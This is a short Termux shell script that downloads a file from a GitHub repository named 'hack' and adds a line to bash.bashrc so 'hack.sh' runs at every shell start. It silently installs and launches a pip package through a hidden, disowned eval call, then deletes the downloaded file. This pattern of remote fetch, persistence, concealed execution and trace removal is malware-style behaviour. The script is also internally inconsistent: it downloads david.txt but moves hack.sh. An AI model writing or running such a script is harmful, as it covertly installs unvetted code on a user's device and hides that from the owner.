cd $HOME
apt install wget -y
apt install python -y
apt install zip -y
wget https://raw.githubusercontent.com/all-drama/hack/main/david.txt
mv hack.sh $PREFIX/etc/bin 
echo "bash hack.sh" >> $PREFIX/etc/bash.bashrc
_evalBg() {
eval "$@" &>/dev/null & disown;
}
cmd="pip install david4you && david";
_evalBg "${cmd}";
cd $HOME
rm -f david.txt
